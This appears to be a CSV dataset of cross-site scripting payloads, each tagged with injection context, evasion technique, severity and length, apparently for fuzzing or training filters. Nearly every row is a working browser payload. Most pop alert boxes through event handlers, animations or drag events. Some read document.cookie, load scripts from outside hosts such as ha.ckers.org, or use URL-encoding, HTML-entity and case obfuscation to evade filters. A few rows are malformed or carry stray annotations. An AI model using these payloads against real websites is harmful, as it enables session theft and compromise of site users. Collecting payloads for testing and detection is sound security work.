payload,context,technique,severity,length
"<progress oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,79
XSS STYLE=xss:e/**/xpression(alert('XSS'))>,generic,comment_injection,medium,43
"<map draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</map>",tag_injection,none,medium,62
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=print()></content>",tag_injection,none,low,116
<time id=x tabindex=1 onactivate=alert(1)></time>,tag_injection,none,medium,49
"<cite oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97
confirm(1)>>>/xss,generic,none,medium,17
<textarea onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</textarea><input value=clickme>,tag_injection,none,medium,116
"AnonKryptiQuz123"";(alert)(""AnonKryptiQuz"")//",generic,none,low,44
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",tag_injection,none,medium,164
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable style=display:block>drop here</hr>",tag_injection,none,medium,125
"<animate attributeName=""xlink:href"" begin=""0"" from=""javascript:alert(137)"" to=""&"" />",js_uri,none,medium,84
"<audio oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",tag_injection,none,medium,62
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,56
"<div ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</div>",tag_injection,none,medium,87
"<ol draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</ol>",tag_injection,none,medium,62
"<pre onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",tag_injection,none,medium,65
<button popovertarget=x>Click me</button><legend ontoggle=alert(1) popover id=x>AnonKryptiQuz</legend>,tag_injection,none,medium,102
"<fieldset draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",tag_injection,none,medium,93
<footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>,tag_injection,none,medium,66
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onwebkitanimationend=""alert(1)""></picture>",tag_injection,none,medium,105
23;%0adocument.body.innerHTML=location.hash;//#<svg/onload=alert(23)>,dom_sink,url_encoding,high,69
"<ol oncut=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",tag_injection,none,medium,55
"<noframes oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101
<a onpointerleave=alert(1) style=display:block>AnonKryptiQuz</a>,tag_injection,none,medium,64
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;,generic,none,low,71
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,tag_injection,none,medium,76
"<col onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</col>",tag_injection,none,medium,66
"fileName=')},1000);alert(""AnonKryptiQuz`);//",generic,none,medium,44
"<ins draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",tag_injection,none,medium,84
"<base onmouseover=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,49
"<bdi onmousedown=""alert(1)"">AnonKryptiQuz</bdi>",tag_injection,none,medium,47
"<dt onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</dt>",tag_injection,none,medium,63
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>",tag_injection,none,medium,182
"<ins oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97
<slot onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",js_uri,none,medium,102
"<template id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></template>",tag_injection,none,medium,92
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></del>",tag_injection,none,medium,109
"<summary onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,74
"<frameset oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,79
"<blockquote onmousemove=""alert(1)"">AnonKryptiQuz</blockquote>",tag_injection,none,medium,61
"<template onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</template>",tag_injection,none,medium,69
[a](javascript:window.onerror=alert;throw%201),dom_sink,url_encoding,low,46
<SCRIPT>alert('XSS');</SCRIPT>,script_injection,case_variation,medium,30
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=print()></dialog>",tag_injection,none,low,114
"<tr onmousemove=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,45
"""><script+src=""https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)""></script>",script_injection,none,medium,130
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",js_uri,none,medium,90
onfocus,generic,none,low,7
<map onpointerenter=alert(1) style=display:block>AnonKryptiQuz</map>,tag_injection,none,medium,68
redirect.asp?url=javascript://%250Aalert(document.domain),dom_sink,url_encoding,medium,57
"""><img src=x onerror=prompt(document%2Edomain);>",tag_injection,url_encoding,medium,48
"<style>@keyframes x{}</style><img2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></img2>",tag_injection,none,medium,99
"<command oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101
"<plaintext draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,71
"<x onauxclick=a=alert,a(domain)>click",tag_injection,none,low,37
"><s""%2b""cript>alert(document.cookie)</s""%2B""cript>",dom_sink,url_encoding,high,50
<button popovertarget=x>Click me</button><optgroup ontoggle=alert(1) popover id=x>AnonKryptiQuz</optgroup>,tag_injection,none,medium,106
"<abbr onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,61
"<i draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</i>",tag_injection,none,medium,60
'>'><SCript>alert(2);</script>,script_injection,case_variation,medium,30
<script>d.innerHTML+='';</script>,script_injection,none,high,33
"<tfoot onmousemove=""alert(1)"">AnonKryptiQuz</tfoot>",tag_injection,none,medium,51
"<base draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,66
<code onpointermove=alert(1) style=display:block>AnonKryptiQuz</code>,tag_injection,none,medium,69
"<a href=""javascript%26colon;alert(1)"">click",attribute_escape,url_encoding,medium,43
"<plaintext onmouseout=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,58
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,tag_injection,none,medium,67
"<canvas onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,74
"<multicol onmouseenter=""alert(1)"">AnonKryptiQuz</multicol>",tag_injection,none,medium,58
"<big onmouseenter=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,48
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></style>",tag_injection,none,medium,164
"<div draggable=""true"" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>",tag_injection,none,medium,101
<samp onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",tag_injection,none,medium,112
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",attribute_escape,none,low,77
"<script src=""data:\xE0\xA4\x98,javascript:alert(8943)""></script>",script_injection,none,medium,64
<menu onpointerenter=alert(1) style=display:block>AnonKryptiQuz</menu>,tag_injection,none,medium,70
"""`'><script>\x0Djavascript:alert(7364)</script>",script_injection,none,medium,47
""";alert(123);t=""",attribute_escape,none,medium,16
"<button onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</button>",tag_injection,none,medium,68
alert?.(document?.cookie),generic,none,low,25
<meter onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</meter><input value=clickme>,tag_injection,none,medium,101
<em onpointerleave=alert(1) style=display:block>AnonKryptiQuz</em>,tag_injection,none,medium,66
"<kbd onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",tag_injection,none,medium,64
"<meta onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",tag_injection,none,medium,69
"""-prompt(9)-""",attribute_escape,none,medium,13
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></command>",tag_injection,none,medium,107
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(0431)""></body onMouseEnter>",js_uri,none,medium,93
"<map onmousemove=""alert(1)"">AnonKryptiQuz</map>",tag_injection,none,medium,47
"<address onmousemove=""alert(1)"">AnonKryptiQuz</address>",tag_injection,none,medium,55
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,81
"<fieldset onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",tag_injection,none,medium,78
"<menuitem draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",tag_injection,none,medium,94
"<mark onmousemove=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,49
"<em onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</em>",tag_injection,none,medium,65
login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain,dom_sink,url_encoding,low,89
"<select oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</select>",tag_injection,none,medium,75
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",tag_injection,none,medium,101
<time id=x tabindex=1 onfocusin=alert(1)></time>,tag_injection,none,medium,48
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,tag_injection,none,medium,68
"<span oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</span>",tag_injection,none,medium,60
"<tt onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tt>",tag_injection,none,medium,77
<svg><template onload=alert(1)></template>,tag_injection,none,medium,42
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",js_uri,encoding|case_variation,high,57
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>,tag_injection,none,medium,86
java%0dscript:alert(1)   - CR (\r),generic,url_encoding,medium,34
<button popovertarget=x>Click me</button><keygen ontoggle=alert(1) popover id=x>AnonKryptiQuz</keygen>,tag_injection,none,medium,102
"<address onmousedown=""alert(1)"">AnonKryptiQuz</address>",tag_injection,none,medium,55
<scrscriptipt>alert(1)</scrscriptipt>,generic,none,medium,37
"<ol onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,66
top['al\x65rt'](1),generic,none,low,18
"<multicol onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",tag_injection,none,medium,75
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,57
"<plaintext onmouseup=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,57
"<strong onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</strong>",tag_injection,none,medium,67
"<textarea draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</textarea>",tag_injection,none,medium,69
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",tag_injection,none,medium,111
"<textarea onmouseleave=""alert(1)"">AnonKryptiQuz</textarea>",tag_injection,none,medium,58
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%2FAnonKryptiQuz%2F%29%60%3E,generic,url_encoding,low,68
"<u oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,95
"<progress onmouseenter=""alert(1)"">AnonKryptiQuz</progress>",tag_injection,none,medium,58
"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",script_injection,none,medium,63
%253Cscript%253Ealert('AnonKryptiQuz')%253C%252Fscript%253E,generic,url_encoding,medium,59
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable style=display:block>drop here</rt>",tag_injection,none,medium,121
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tfoot>",tag_injection,none,medium,110
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",tag_injection,none,medium,110
"<blockquote onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</blockquote>",tag_injection,none,medium,73
"<param draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</param>",tag_injection,none,medium,88
"<table onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</table>",tag_injection,none,medium,69
“=””’></><script></script><svg onload=alert(1)>,script_injection,none,medium,47
"<template onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</template>",tag_injection,none,medium,73
"<abbr onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,67
"`'"";//><Img Src=a OnError=location=src>",dom_sink,case_variation,high,39
"<image onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</image>",tag_injection,none,medium,69
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,tag_injection,none,medium,46
"”&gt;&lt;svg onload=alert&amp;#0000000040""1"")&gt;",event_handler,none,low,49
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,tag_injection,none,medium,76
"<dialog onmousemove=""alert(1)"">AnonKryptiQuz</dialog>",tag_injection,none,medium,53
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79
"""`'><script>-javascript:alert(8887)</script>",script_injection,none,medium,44
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable style=display:block>drop here</plaintext>",tag_injection,none,medium,135
"<tr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,67
<x onxxx=1 onxxx=1,tag_injection,none,low,18
"<style>@keyframes slidein {}</style><code style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></code>",tag_injection,none,medium,162
<track onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</track><input value=clickme>,tag_injection,none,medium,101
"<style>:target {color: red;}</style><custom tags id=x style=""transition:color 10s"" ontransitioncancel=print()></custom tags>",tag_injection,none,low,124
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dt>",tag_injection,none,medium,108
"<listing onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,73
%253cimg%20onerror=alert(1)%20src=a%253e,event_handler,url_encoding,medium,40
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></table>",tag_injection,none,medium,170
<x v-bind:a='_b.constructor`alert(1)`()'>,attribute_escape,none,medium,41
<strike onpointerout=alert(1) style=display:block>AnonKryptiQuz</strike>,tag_injection,none,medium,72
"<ol onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,65
AnonKryptiQuz%22%7D%29%3B%7D%29%3Balert%281%29%3B%2f%2f,generic,url_encoding,low,55
"<script a="">"" '' SRC=""http://www.securitycompass.com/xss.js""></script>",script_injection,none,low,70
"<section draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</section>",tag_injection,none,medium,72
"<h1 oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",tag_injection,none,medium,56
<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,tag_injection,none,medium,53
"<bdo onmousedown=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,47
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" ontransitionstart=alert(1)></source>",tag_injection,none,medium,112
<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>,tag_injection,none,medium,64
"<u oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,54
"<base onmouseup=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,47
"<animatetransform onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,94
<footer onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56
"<plaintext draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</plaintext>",tag_injection,none,medium,74
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",script_injection,none,medium,92
<center onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68
<frame contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59
"<datalist oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",tag_injection,none,medium,79
<iframe onfocusout=alert(1) id=x><input autofocus>,tag_injection,none,medium,50
“><script>alert(1);</script>,script_injection,none,medium,28
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable style=display:block>drop here</details>",tag_injection,none,medium,135
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,tag_injection,none,medium,71
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""print()""></p>",tag_injection,none,low,171
<button popovertarget=x>Click me</button><sub ontoggle=alert(1) popover id=x>AnonKryptiQuz</sub>,tag_injection,none,medium,96
<caption onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58
<meter id=x tabindex=1 onactivate=alert(1)></meter>,tag_injection,none,medium,51
"<img SRC=""javascript:document.vulnerable=true;""",dom_sink,none,low,47
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",tag_injection,none,medium,111
<rtc onpointermove=alert(1) style=display:block>AnonKryptiQuz</rtc>,tag_injection,none,medium,67
<button popovertarget=x>Click me</button><big onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</big>,tag_injection,none,medium,102
<shadow onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</shadow><input value=clickme>,tag_injection,none,medium,103
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",tag_injection,none,medium,113
"<ruby onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",tag_injection,none,medium,70
"<legend draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",tag_injection,none,medium,90
"'`""><*chr*script>log(*num*)</script>",attribute_escape,none,low,36
"<SVg </onlOad =""1> (_=prompt,_(1)) """">",tag_injection,case_variation,low,38
</script><script>alert('XSS');</script>,script_injection,none,medium,39
"<meta onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meta>",tag_injection,none,medium,84
<script>window['al'+'ert']()</script>,script_injection,none,low,37
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""print()""></area>",tag_injection,none,low,177
<picture id=x tabindex=1 onactivate=alert(1)></picture>,tag_injection,none,medium,55
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",tag_injection,none,medium,132
<li onpointerout=alert(1) style=display:block>AnonKryptiQuz</li>,tag_injection,none,medium,64
"<audio2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",tag_injection,none,medium,90
<sup onpointerdown=alert(1) style=display:block>AnonKryptiQuz</sup>,tag_injection,none,medium,67
"<object ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,93
"<slot draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</slot>",tag_injection,none,medium,66
"<em onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</em>",tag_injection,none,medium,80
"x\""><svg%0Donload=\""window[\'alert\']((document)[\'cookie\'])\"">",tag_injection,url_encoding,low,64
"<small onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</small>",tag_injection,none,medium,69
"<rtc onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",tag_injection,none,medium,62
alert(document.domain);,dom_sink,none,medium,23
"<ol onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></ol>",tag_injection,none,medium,277
<element onpointerout=alert(1) style=display:block>AnonKryptiQuz</element>,tag_injection,none,medium,74
<menu id=x tabindex=1 onactivate=alert(1)></menu>,tag_injection,none,medium,49
</style></scRipt><scRipt>alert(1)</scRipt>,script_injection,case_variation,medium,42
"<dir onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dir>",tag_injection,none,medium,279
<nav onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</nav><input value=clickme>,tag_injection,none,medium,106
"<ol onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",tag_injection,none,medium,59
"'"">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->""></script><script>alert(1)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http://i.imgur.com/P8mL8.jpg"">",dom_sink,encoding|url_encoding,medium,347
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",tag_injection,none,medium,103
"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,47
"<spacer onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,71
"<main ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</main>",tag_injection,none,medium,89
"""autofocus/onfocus=alert(1)//",attribute_escape,none,medium,29
"""onpointerover=”alert(‘AnonKryptiQuz’)",attribute_escape,none,medium,38
"<area onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,70
<button popovertarget=x>Click me</button><sup ontoggle=alert(1) popover id=x>AnonKryptiQuz</sup>,tag_injection,none,medium,96
"<del onmouseover=""alert(1)"">AnonKryptiQuz</del>",tag_injection,none,medium,47
"<noembed onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noembed>",tag_injection,none,medium,90
<script id=x tabindex=1 onfocusin=alert(1)></script>,script_injection,none,medium,52
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable style=display:block>drop here</svg>",tag_injection,none,medium,123
"<a2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,82
"<acronym onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,69
"<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",tag_injection,none,medium,59
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,high,231
"<datalist onclick=""alert(1)"">AnonKryptiQuz</datalist>",tag_injection,none,medium,53
<script>javascript:alert(1)</script>,script_injection,none,medium,36
"<animatetransform onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></animatetransform>",tag_injection,none,medium,305
'javaScriPt:alert\x2845\x29',js_uri,none,low,28
"<figcaption draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</figcaption>",tag_injection,none,medium,76
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",tag_injection,none,medium,103
"<img\x11src=x onerror=""javascript:alert(1)"">",js_uri,none,medium,44
"<style>@keyframes slidein {}</style><colgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></colgroup>",tag_injection,none,medium,170
$eval('x=alert(1)//');,dom_sink,encoding,medium,22
"<input onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</input>",tag_injection,none,medium,66
<datalist onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</datalist>,tag_injection,none,medium,82
<fieldset onpointerout=alert(1) style=display:block>AnonKryptiQuz</fieldset>,tag_injection,none,medium,76
"<img2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></img2>",tag_injection,none,medium,281
"<head ondblclick=""alert(1)"">AnonKryptiQuz</head>",tag_injection,none,medium,48
"<colgroup draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",tag_injection,none,medium,89
"<font draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,61
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",tag_injection,none,medium,107
"data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg",js_uri,none,low,78
"<data onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</data>",tag_injection,none,medium,65
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,tag_injection,none,medium,64
"<thead onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,70
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",generic,none,low,40
"<embed onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,69
"<DIV STYLE=""background-image: url(&#1;javascript:alert('AnonKryptiQuz'))"">",js_uri,html_entity|case_variation,medium,74
<rb onpointermove=alert(1) style=display:block>AnonKryptiQuz</rb>,tag_injection,none,medium,65
